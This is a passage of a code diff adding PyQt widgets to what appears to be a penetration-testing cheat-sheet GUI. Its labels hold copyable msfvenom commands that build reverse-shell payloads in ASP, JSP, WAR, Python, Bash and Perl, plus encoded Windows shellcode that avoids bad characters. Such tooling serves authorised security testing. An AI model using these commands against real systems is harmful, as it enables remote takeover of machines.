+        self.msfv_web_php_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_php_spacer1
+        if hasattr(self, 'msfv_web_php_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer1)
+            self.msfv_web_php_spacer1.deleteLater()
+        self.msfv_web_php_spacer1 = QLabel()
+        self.msfv_web_php_spacer1.setFixedWidth(40)
+        self.msfv_web_php_spacer1.setFixedHeight(50)
+     
+        # msfv_web_php_spacer2
+        if hasattr(self, 'msfv_web_php_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer2)
+            self.msfv_web_php_spacer2.deleteLater()
+        self.msfv_web_php_spacer2 = QLabel()
+        self.msfv_web_php_spacer2.setFixedWidth(40)
+        self.msfv_web_php_spacer2.setFixedHeight(50)
+     
+        # msfv_web_php spacer & divider layout
+        self.tab7_container_layout.insertWidget(151, self.msfv_web_php_spacer1)
+        self.tab7_container_layout.insertWidget(152, self.msfv_web_php_divider1)
+        self.tab7_container_layout.insertWidget(153, self.msfv_web_php_divider2)
+        self.tab7_container_layout.insertWidget(154, self.msfv_web_php_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_asp
+        if hasattr(self, 'msfv_web_asp'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp)
+            self.msfv_web_asp.deleteLater()
+        self.msfv_web_asp = QLabel("[+ Web Payloads: ASP ]")
+        self.msfv_web_asp.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(155,self.msfv_web_asp)
+     
+        # msfv_web_asp_Scan1
+        if hasattr(self, 'msfv_web_asp_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_Scan1)
+            self.msfv_web_asp_Scan1.deleteLater()
+        self.msfv_web_asp_Scan1 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f asp > shell.asp")
+        self.msfv_web_asp_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(156,self.msfv_web_asp_Scan1)
+     
+        # msfv_web_asp_Scan1_Copy
+        if hasattr(self, 'msfv_web_asp_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_Scan1_Copy)
+            self.msfv_web_asp_Scan1_Copy.deleteLater()
+        self.msfv_web_asp_Scan1_Copy = QPushButton()
+        self.msfv_web_asp_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_asp_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_asp_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_asp_Scan1.text()))
+        self.msfv_web_asp_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_asp_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_asp_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_asp_Scan1)
+        self.tab7_container_layout.insertLayout(157, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_asp_divider1
+        if hasattr(self, 'msfv_web_asp_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_divider1)
+            self.msfv_web_asp_divider1.deleteLater()
+        self.msfv_web_asp_divider1 = QFrame()
+        self.msfv_web_asp_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_asp_divider1.setLineWidth(3)
+        self.msfv_web_asp_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_asp_divider2
+        if hasattr(self, 'msfv_web_asp_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_divider2)
+            self.msfv_web_asp_divider2.deleteLater()
+        self.msfv_web_asp_divider2 = QFrame()
+        self.msfv_web_asp_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_asp_divider2.setLineWidth(3)
+        self.msfv_web_asp_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_asp_spacer1
+        if hasattr(self, 'msfv_web_asp_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_spacer1)
+            self.msfv_web_asp_spacer1.deleteLater()
+        self.msfv_web_asp_spacer1 = QLabel()
+        self.msfv_web_asp_spacer1.setFixedWidth(40)
+        self.msfv_web_asp_spacer1.setFixedHeight(50)
+     
+        # msfv_web_asp_spacer2
+        if hasattr(self, 'msfv_web_asp_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_asp_spacer2)
+            self.msfv_web_asp_spacer2.deleteLater()
+        self.msfv_web_asp_spacer2 = QLabel()
+        self.msfv_web_asp_spacer2.setFixedWidth(40)
+        self.msfv_web_asp_spacer2.setFixedHeight(50)
+     
+        # msfv_web_asp spacer & divider layout
+        self.tab7_container_layout.insertWidget(158, self.msfv_web_asp_spacer1)
+        self.tab7_container_layout.insertWidget(159, self.msfv_web_asp_divider1)
+        self.tab7_container_layout.insertWidget(160, self.msfv_web_asp_divider2)
+        self.tab7_container_layout.insertWidget(161, self.msfv_web_asp_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_jsp
+        if hasattr(self, 'msfv_web_jsp'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp)
+            self.msfv_web_jsp.deleteLater()
+        self.msfv_web_jsp = QLabel("[+ Web Payloads: JSP ]")
+        self.msfv_web_jsp.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(162,self.msfv_web_jsp)
+     
+        # msfv_web_jsp_Scan1
+        if hasattr(self, 'msfv_web_jsp_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_Scan1)
+            self.msfv_web_jsp_Scan1.deleteLater()
+        self.msfv_web_jsp_Scan1 = QLabel("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.jsp")
+        self.msfv_web_jsp_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(163,self.msfv_web_jsp_Scan1)
+     
+        # msfv_web_jsp_Scan1_Copy
+        if hasattr(self, 'msfv_web_jsp_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_Scan1_Copy)
+            self.msfv_web_jsp_Scan1_Copy.deleteLater()
+        self.msfv_web_jsp_Scan1_Copy = QPushButton()
+        self.msfv_web_jsp_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_jsp_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_jsp_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_jsp_Scan1.text()))
+        self.msfv_web_jsp_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_jsp_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_jsp_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_jsp_Scan1)
+        self.tab7_container_layout.insertLayout(164, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_jsp_divider1
+        if hasattr(self, 'msfv_web_jsp_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_divider1)
+            self.msfv_web_jsp_divider1.deleteLater()
+        self.msfv_web_jsp_divider1 = QFrame()
+        self.msfv_web_jsp_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_jsp_divider1.setLineWidth(3)
+        self.msfv_web_jsp_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_jsp_divider2
+        if hasattr(self, 'msfv_web_jsp_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_divider2)
+            self.msfv_web_jsp_divider2.deleteLater()
+        self.msfv_web_jsp_divider2 = QFrame()
+        self.msfv_web_jsp_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_jsp_divider2.setLineWidth(3)
+        self.msfv_web_jsp_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_jsp_spacer1
+        if hasattr(self, 'msfv_web_jsp_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_spacer1)
+            self.msfv_web_jsp_spacer1.deleteLater()
+        self.msfv_web_jsp_spacer1 = QLabel()
+        self.msfv_web_jsp_spacer1.setFixedWidth(40)
+        self.msfv_web_jsp_spacer1.setFixedHeight(50)
+     
+        # msfv_web_jsp_spacer2
+        if hasattr(self, 'msfv_web_jsp_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_spacer2)
+            self.msfv_web_jsp_spacer2.deleteLater()
+        self.msfv_web_jsp_spacer2 = QLabel()
+        self.msfv_web_jsp_spacer2.setFixedWidth(40)
+        self.msfv_web_jsp_spacer2.setFixedHeight(50)
+     
+        # msfv_web_jsp spacer & divider layout
+        self.tab7_container_layout.insertWidget(165, self.msfv_web_jsp_spacer1)
+        self.tab7_container_layout.insertWidget(166, self.msfv_web_jsp_divider1)
+        self.tab7_container_layout.insertWidget(167, self.msfv_web_jsp_divider2)
+        self.tab7_container_layout.insertWidget(168, self.msfv_web_jsp_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_war
+        if hasattr(self, 'msfv_web_war'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war)
+            self.msfv_web_war.deleteLater()
+        self.msfv_web_war = QLabel("[+ Web Payloads: WAR ]")
+        self.msfv_web_war.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(169,self.msfv_web_war)
+     
+        # msfv_web_war_Scan1
+        if hasattr(self, 'msfv_web_war_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_Scan1)
+            self.msfv_web_war_Scan1.deleteLater()
+        self.msfv_web_war_Scan1 = QLabel("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f war > shell.war")
+        self.msfv_web_war_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(170,self.msfv_web_war_Scan1)
+     
+        # msfv_web_war_Scan1_Copy
+        if hasattr(self, 'msfv_web_war_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_Scan1_Copy)
+            self.msfv_web_war_Scan1_Copy.deleteLater()
+        self.msfv_web_war_Scan1_Copy = QPushButton()
+        self.msfv_web_war_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_war_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_war_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_war_Scan1.text()))
+        self.msfv_web_war_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_war_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_war_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_war_Scan1)
+        self.tab7_container_layout.insertLayout(171, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_war_divider1
+        if hasattr(self, 'msfv_web_war_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_divider1)
+            self.msfv_web_war_divider1.deleteLater()
+        self.msfv_web_war_divider1 = QFrame()
+        self.msfv_web_war_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_war_divider1.setLineWidth(3)
+        self.msfv_web_war_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_war_divider2
+        if hasattr(self, 'msfv_web_war_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_divider2)
+            self.msfv_web_war_divider2.deleteLater()
+        self.msfv_web_war_divider2 = QFrame()
+        self.msfv_web_war_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_war_divider2.setLineWidth(3)
+        self.msfv_web_war_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_war_spacer1
+        if hasattr(self, 'msfv_web_war_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_spacer1)
+            self.msfv_web_war_spacer1.deleteLater()
+        self.msfv_web_war_spacer1 = QLabel()
+        self.msfv_web_war_spacer1.setFixedWidth(40)
+        self.msfv_web_war_spacer1.setFixedHeight(50)
+     
+        # msfv_web_war_spacer2
+        if hasattr(self, 'msfv_web_war_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_war_spacer2)
+            self.msfv_web_war_spacer2.deleteLater()
+        self.msfv_web_war_spacer2 = QLabel()
+        self.msfv_web_war_spacer2.setFixedWidth(40)
+        self.msfv_web_war_spacer2.setFixedHeight(50)
+     
+        # msfv_web_war spacer & divider layout
+        self.tab7_container_layout.insertWidget(172, self.msfv_web_war_spacer1)
+        self.tab7_container_layout.insertWidget(173, self.msfv_web_war_divider1)
+        self.tab7_container_layout.insertWidget(174, self.msfv_web_war_divider2)
+        self.tab7_container_layout.insertWidget(175, self.msfv_web_war_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_python
+        if hasattr(self, 'msfv_web_python'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python)
+            self.msfv_web_python.deleteLater()
+        self.msfv_web_python = QLabel("[+ Scripting Payloads: Python ]")
+        self.msfv_web_python.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(176,self.msfv_web_python)
+     
+        # msfv_web_python_Scan1
+        if hasattr(self, 'msfv_web_python_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_Scan1)
+            self.msfv_web_python_Scan1.deleteLater()
+        self.msfv_web_python_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_python LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.py")
+        self.msfv_web_python_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(177,self.msfv_web_python_Scan1)
+     
+        # msfv_web_python_Scan1_Copy
+        if hasattr(self, 'msfv_web_python_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_Scan1_Copy)
+            self.msfv_web_python_Scan1_Copy.deleteLater()
+        self.msfv_web_python_Scan1_Copy = QPushButton()
+        self.msfv_web_python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_python_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_python_Scan1.text()))
+        self.msfv_web_python_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_python_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_python_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_python_Scan1)
+        self.tab7_container_layout.insertLayout(178, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_python_divider1
+        if hasattr(self, 'msfv_web_python_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_divider1)
+            self.msfv_web_python_divider1.deleteLater()
+        self.msfv_web_python_divider1 = QFrame()
+        self.msfv_web_python_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_python_divider1.setLineWidth(3)
+        self.msfv_web_python_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_python_divider2
+        if hasattr(self, 'msfv_web_python_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_divider2)
+            self.msfv_web_python_divider2.deleteLater()
+        self.msfv_web_python_divider2 = QFrame()
+        self.msfv_web_python_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_python_divider2.setLineWidth(3)
+        self.msfv_web_python_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_python_spacer1
+        if hasattr(self, 'msfv_web_python_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_spacer1)
+            self.msfv_web_python_spacer1.deleteLater()
+        self.msfv_web_python_spacer1 = QLabel()
+        self.msfv_web_python_spacer1.setFixedWidth(40)
+        self.msfv_web_python_spacer1.setFixedHeight(50)
+     
+        # msfv_web_python_spacer2
+        if hasattr(self, 'msfv_web_python_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_python_spacer2)
+            self.msfv_web_python_spacer2.deleteLater()
+        self.msfv_web_python_spacer2 = QLabel()
+        self.msfv_web_python_spacer2.setFixedWidth(40)
+        self.msfv_web_python_spacer2.setFixedHeight(50)
+     
+        # msfv_web_python spacer & divider layout
+        self.tab7_container_layout.insertWidget(179, self.msfv_web_python_spacer1)
+        self.tab7_container_layout.insertWidget(180, self.msfv_web_python_divider1)
+        self.tab7_container_layout.insertWidget(181, self.msfv_web_python_divider2)
+        self.tab7_container_layout.insertWidget(182, self.msfv_web_python_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_bash
+        if hasattr(self, 'msfv_web_bash'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash)
+            self.msfv_web_bash.deleteLater()
+        self.msfv_web_bash = QLabel("[+ Scripting Payloads: Bash ]")
+        self.msfv_web_bash.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(183,self.msfv_web_bash)
+     
+        # msfv_web_bash_Scan1
+        if hasattr(self, 'msfv_web_bash_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_Scan1)
+            self.msfv_web_bash_Scan1.deleteLater()
+        self.msfv_web_bash_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_bash LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.sh")
+        self.msfv_web_bash_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(184,self.msfv_web_bash_Scan1)
+     
+        # msfv_web_bash_Scan1_Copy
+        if hasattr(self, 'msfv_web_bash_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_Scan1_Copy)
+            self.msfv_web_bash_Scan1_Copy.deleteLater()
+        self.msfv_web_bash_Scan1_Copy = QPushButton()
+        self.msfv_web_bash_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_bash_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_bash_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_bash_Scan1.text()))
+        self.msfv_web_bash_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_bash_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_bash_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_bash_Scan1)
+        self.tab7_container_layout.insertLayout(185, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_bash_divider1
+        if hasattr(self, 'msfv_web_bash_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_divider1)
+            self.msfv_web_bash_divider1.deleteLater()
+        self.msfv_web_bash_divider1 = QFrame()
+        self.msfv_web_bash_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_bash_divider1.setLineWidth(3)
+        self.msfv_web_bash_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_bash_divider2
+        if hasattr(self, 'msfv_web_bash_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_divider2)
+            self.msfv_web_bash_divider2.deleteLater()
+        self.msfv_web_bash_divider2 = QFrame()
+        self.msfv_web_bash_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_bash_divider2.setLineWidth(3)
+        self.msfv_web_bash_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_bash_spacer1
+        if hasattr(self, 'msfv_web_bash_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_spacer1)
+            self.msfv_web_bash_spacer1.deleteLater()
+        self.msfv_web_bash_spacer1 = QLabel()
+        self.msfv_web_bash_spacer1.setFixedWidth(40)
+        self.msfv_web_bash_spacer1.setFixedHeight(50)
+     
+        # msfv_web_bash_spacer2
+        if hasattr(self, 'msfv_web_bash_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_bash_spacer2)
+            self.msfv_web_bash_spacer2.deleteLater()
+        self.msfv_web_bash_spacer2 = QLabel()
+        self.msfv_web_bash_spacer2.setFixedWidth(40)
+        self.msfv_web_bash_spacer2.setFixedHeight(50)
+     
+        # msfv_web_bash spacer & divider layout
+        self.tab7_container_layout.insertWidget(186, self.msfv_web_bash_spacer1)
+        self.tab7_container_layout.insertWidget(187, self.msfv_web_bash_divider1)
+        self.tab7_container_layout.insertWidget(188, self.msfv_web_bash_divider2)
+        self.tab7_container_layout.insertWidget(189, self.msfv_web_bash_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_perl
+        if hasattr(self, 'msfv_web_perl'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl)
+            self.msfv_web_perl.deleteLater()
+        self.msfv_web_perl = QLabel("[+ Scripting Payloads: Perl ]")
+        self.msfv_web_perl.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(190,self.msfv_web_perl)
+     
+        # msfv_web_perl_Scan1
+        if hasattr(self, 'msfv_web_perl_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_Scan1)
+            self.msfv_web_perl_Scan1.deleteLater()
+        self.msfv_web_perl_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_perl LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.pl")
+        self.msfv_web_perl_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(191,self.msfv_web_perl_Scan1)
+     
+        # msfv_web_perl_Scan1_Copy
+        if hasattr(self, 'msfv_web_perl_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_Scan1_Copy)
+            self.msfv_web_perl_Scan1_Copy.deleteLater()
+        self.msfv_web_perl_Scan1_Copy = QPushButton()
+        self.msfv_web_perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_perl_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_perl_Scan1.text()))
+        self.msfv_web_perl_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_perl_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_perl_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_perl_Scan1)
+        self.tab7_container_layout.insertLayout(192, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_perl_divider1
+        if hasattr(self, 'msfv_web_perl_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_divider1)
+            self.msfv_web_perl_divider1.deleteLater()
+        self.msfv_web_perl_divider1 = QFrame()
+        self.msfv_web_perl_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_perl_divider1.setLineWidth(3)
+        self.msfv_web_perl_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_perl_divider2
+        if hasattr(self, 'msfv_web_perl_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_divider2)
+            self.msfv_web_perl_divider2.deleteLater()
+        self.msfv_web_perl_divider2 = QFrame()
+        self.msfv_web_perl_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_perl_divider2.setLineWidth(3)
+        self.msfv_web_perl_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_perl_spacer1
+        if hasattr(self, 'msfv_web_perl_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_spacer1)
+            self.msfv_web_perl_spacer1.deleteLater()
+        self.msfv_web_perl_spacer1 = QLabel()
+        self.msfv_web_perl_spacer1.setFixedWidth(40)
+        self.msfv_web_perl_spacer1.setFixedHeight(50)
+     
+        # msfv_web_perl_spacer2
+        if hasattr(self, 'msfv_web_perl_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_perl_spacer2)
+            self.msfv_web_perl_spacer2.deleteLater()
+        self.msfv_web_perl_spacer2 = QLabel()
+        self.msfv_web_perl_spacer2.setFixedWidth(40)
+        self.msfv_web_perl_spacer2.setFixedHeight(50)
+     
+        # msfv_web_perl spacer & divider layout
+        self.tab7_container_layout.insertWidget(193, self.msfv_web_perl_spacer1)
+        self.tab7_container_layout.insertWidget(194, self.msfv_web_perl_divider1)
+        self.tab7_container_layout.insertWidget(195, self.msfv_web_perl_divider2)
+        self.tab7_container_layout.insertWidget(196, self.msfv_web_perl_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_badchar
+        if hasattr(self, 'msfv_web_badchar'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar)
+            self.msfv_web_badchar.deleteLater()
+        self.msfv_web_badchar = QLabel("[+ Creating an Msfvenom Payload with an encoder while removing bad characters ]")
+        self.msfv_web_badchar.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(197,self.msfv_web_badchar)
+     
+        # msfv_web_badchar_Scan1
+        if hasattr(self, 'msfv_web_badchar_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_Scan1)
+            self.msfv_web_badchar_Scan1.deleteLater()
+        self.msfv_web_badchar_Scan1 = QLabel("msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=" + self.lhost + " LPORT=" + self.lport + " -f c -e x86/shikata_ga_nai -b \"x0Ax0D\"")
+        self.msfv_web_badchar_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(198,self.msfv_web_badchar_Scan1)
+     
+        # msfv_web_badchar_Scan1_Copy
+        if hasattr(self, 'msfv_web_badchar_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_Scan1_Copy)
+            self.msfv_web_badchar_Scan1_Copy.deleteLater()
+        self.msfv_web_badchar_Scan1_Copy = QPushButton()
+        self.msfv_web_badchar_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_badchar_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_badchar_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_badchar_Scan1.text()))
+        self.msfv_web_badchar_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_badchar_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_badchar_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_badchar_Scan1)
+        self.tab7_container_layout.insertLayout(199, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_badchar_divider1
+        if hasattr(self, 'msfv_web_badchar_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_divider1)
+            self.msfv_web_badchar_divider1.deleteLater()
+        self.msfv_web_badchar_divider1 = QFrame()
+        self.msfv_web_badchar_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_badchar_divider1.setLineWidth(3)
+        self.msfv_web_badchar_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_badchar_divider2
+        if hasattr(self, 'msfv_web_badchar_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_divider2)
+            self.msfv_web_badchar_divider2.deleteLater()
+        self.msfv_web_badchar_divider2 = QFrame()
+        self.msfv_web_badchar_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_badchar_divider2.setLineWidth(3)
+        self.msfv_web_badchar_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_badchar_spacer1
+        if hasattr(self, 'msfv_web_badchar_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_spacer1)
+            self.msfv_web_badchar_spacer1.deleteLater()
+        self.msfv_web_badchar_spacer1 = QLabel()
+        self.msfv_web_badchar_spacer1.setFixedWidth(40)
+        self.msfv_web_badchar_spacer1.setFixedHeight(50)
+     
+        # msfv_web_badchar_spacer2
+        if hasattr(self, 'msfv_web_badchar_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_spacer2)
+            self.msfv_web_badchar_spacer2.deleteLater()
+        self.msfv_web_badchar_spacer2 = QLabel()
+        self.msfv_web_badchar_spacer2.setFixedWidth(40)
+        self.msfv_web_badchar_spacer2.setFixedHeight(50)
+     
+        # msfv_web_badchar spacer & divider layout
+        self.tab7_container_layout.insertWidget(200, self.msfv_web_badchar_spacer1)
+        self.tab7_container_layout.insertWidget(201, self.msfv_web_badchar_divider1)
